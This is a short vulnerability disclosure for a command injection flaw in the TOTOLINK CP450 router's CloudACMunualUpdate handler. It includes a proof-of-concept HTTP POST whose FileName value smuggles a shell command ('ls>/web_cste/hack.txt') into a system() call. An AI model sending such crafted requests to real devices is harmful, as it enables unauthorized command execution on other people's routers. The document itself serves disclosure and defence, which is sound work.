## CP450 command injection

### Overview

* Vendor: TOTOLINK

* Product: CP450
* Version: TOTOLINK_C8B193C-1H_CP450_CP0017_8881A_SPI_8M64M_V4.1.0cu.747_B20191224_ALL.web

* Manufacturer's address：https://www.totolink.net/
* Firmware download address ：https://www.totolink.net/data/upload/20200414/2254ce90058da1a549566852c86031db.zip

### Vulnerability details

Totolink outdoor CPE CP450 V4.1.0cu.747_B20191224 were discovered to contain a command injection vulnerability in the `CloudACMunualUpdate` function via the **FileName** parameter. 

Attacker can control `v31` by setting the parameter `FileName`.

![image-20240421163827190](./img/1.png)

Without any checking, `v31` will be passed to system function in line 157.

![image-20240421163827190](./img/2.png)

This vulnerability allows attackers to execute arbitrary commands via a crafted request.

#### PoC

```
POST /cgi-bin/cstecgi.cgi HTTP/1.1
Host: 192.168.0.254
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/119.0
Accept: application/json, text/javascript, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 132
Origin: http://192.168.0.254
Connection: close
Referer: http://192.168.0.254/adm/cloud_update.asp
Cookie: SESSION_ID=2:1801026000:2

{
    "topicurl": "setting/CloudACMunualUpdate",
    "FileName": "1;ls>/web_cste/hack.txt;ls"
}
```

